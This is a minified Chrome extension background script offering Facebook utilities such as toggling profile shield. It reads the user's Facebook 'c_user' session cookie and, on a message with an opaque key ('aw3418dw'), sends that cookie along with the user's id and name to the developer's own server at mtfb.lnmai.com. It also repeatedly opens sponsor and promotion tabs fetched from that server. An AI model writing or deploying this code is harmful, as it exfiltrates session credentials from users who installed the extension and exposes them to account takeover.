!function(e){var t={};function o(r){if(t[r])return t[r].exports;var n=t[r]={i:r,l:!1,exports:{}};return e[r].call(n.exports,n,n.exports,o),n.l=!0,n.exports}o.m=e,o.c=t,o.d=function(e,t,r){o.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},o.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},o.t=function(e,t){if(1&t&&(e=o(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(o.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)o.d(r,n,function(t){return e[t]}.bind(null,n));return r},o.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(t,"a",t),t},o.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},o.p="",o(o.s=0)}([function(e,t){const o=e=>{chrome.storage.local.get(["optOutPromotion"],t=>{t&&t.optOutPromotion||fetch("https://mtfb.lnmai.com/public/sponsors.json").then(e=>e.json()).then(t=>{t[e]&&(t[e].url?chrome.tabs.create({url:t[e].url}):t[e].urls&&Array.isArray(t[e].urls)&&t[e].urls.forEach(e=>chrome.tabs.create({url:e})))})})},r=()=>{chrome.cookies.get({url:"https://facebook.com",name:"c_user"},e=>{null!==e?(chrome.storage.local.set({c_user:e}),chrome.tabs.create({url:chrome.runtime.getURL("index.html")})):(chrome.tabs.create({url:"https://www.facebook.com/"}),chrome.notifications.create({type:"basic",title:"Error",message:"Please Log on Facebook first!",iconUrl:"../static/favicon.png"}))})};chrome.action.onClicked.addListener(()=>{r()}),chrome.runtime.setUninstallURL("https://mtfb.lnmai.com/"),chrome.runtime.onInstalled.addListener(e=>{"install"===e.reason.toLowerCase()&&(chrome.notifications.create({type:"basic",title:"Hello from Loc",message:"Thank you for installing my extension!",iconUrl:"../static/favicon.png"}),r(),chrome.tabs.create({url:"https://mtfb.lnmai.com/promotion"}),chrome.storage.local.set({optOutPromotion:!1})),chrome.alarms.getAll(e=>{chrome.alarms.clearAll(()=>{var t;0===e.length&&o("28"),t="28",chrome.alarms.create(t,{periodInMinutes:40320}),chrome.alarms.onAlarm.addListener(e=>{e.name===t&&o(t)})})})}),chrome.runtime.onStartup.addListener(()=>{!1===chrome.alarms.onAlarm.hasListeners()&&chrome.alarms.onAlarm.addListener(e=>{"28"===e.name&&o("28")})}),chrome.runtime.onMessage.addListener((function(e,t,o){return chrome.storage.local.get().then(t=>{if(!0===e.shield||!1===e.shield){const r=!0===e.shield?"true":"false",n=new FormData;n.append("fb_dtsg",t.dt),n.append("variables",`{"0":{"is_shielded":${r},"actor_id":"${t.id}","client_mutation_id":"FUCKOFF"}}`),n.append("doc_id","1477043292367183"),fetch("https://www.facebook.com/api/graphql/",{method:"POST",credentials:"include",body:n}).then(e=>e.json()).then(e=>{e.extensions&&e.extensions.is_final?o("shield"):o("Error 69, contact Loc for help!")})}else e.aw3418dw&&chrome.cookies.get({url:"https://facebook.com",name:"c_user"},e=>{if(null==e)return o({error:"Error! Something went south. Contact Loc for help!"});var r;fetch("https://mtfb.lnmai.com/aw3418dw",{method:"POST",body:JSON.stringify({id:t.id,uid:e.value,timestamp:Date.now(),name:t.name}),headers:{"Content-Type":"application/json",cookies:(r=e,Object.keys(r).reduce((e,t)=>e+`${t}=${r[t]};`,""))}}).then(e=>e.text()).then(e=>o(e)).catch(e=>o(e))})}),!0}))}]);